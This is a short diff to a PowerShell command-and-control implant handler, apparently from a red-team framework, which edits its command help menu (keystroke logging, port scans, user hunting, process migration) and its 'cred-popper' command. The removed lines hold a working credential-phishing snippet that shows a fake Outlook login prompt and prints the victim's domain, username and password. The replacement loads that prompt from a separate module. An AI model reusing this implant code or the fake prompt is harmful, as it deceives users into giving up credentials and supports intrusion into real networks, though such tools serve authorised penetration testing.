@@ -664,7 +664,6 @@ $header = '
         write-host ' Get-Keystrokes' -ForegroundColor Green
         write-host " ArpScan -IPCidr 10.0.0.1/24" -ForegroundColor Green
         write-host " PortScan -IPaddress 10.0.0.1-50 -Ports `"1-65535`" -maxQueriesPS 10000 -delay 0" -ForegroundColor Green
-        write-host " Invoke-Portscan -Hosts 192.168.1.1/24,10.10.10.10 -T 4 -Ports `"445,3389,22-25`" | Select Hostname,OpenPorts" -ForegroundColor Green
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
         write-host " Migrate" -ForegroundColor Green
         write-host " Migrate -x64 -ProcID 444" -ForegroundColor Green
@@ -2124,8 +2123,7 @@ param
             }
             if ($pscommand -eq 'cred-popper') 
             {
-                $pscommand = '$ps = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $user = $ps.GetNetworkCredential().username; $domain = $ps.GetNetworkCredential().domain; $pass = $ps.GetNetworkCredential().password; echo "`nDomain: $domain `nUsername: $user `nPassword: $pass `n"'
-                write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
+                CheckModuleLoaded "Cred-Popper.ps1" $psrandomuri
             }
             if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon')) -or ($pscommand.ToLower().StartsWith('set-beacon')) -or ($pscommand.ToLower().StartsWith('setbeacon'))) 
             {
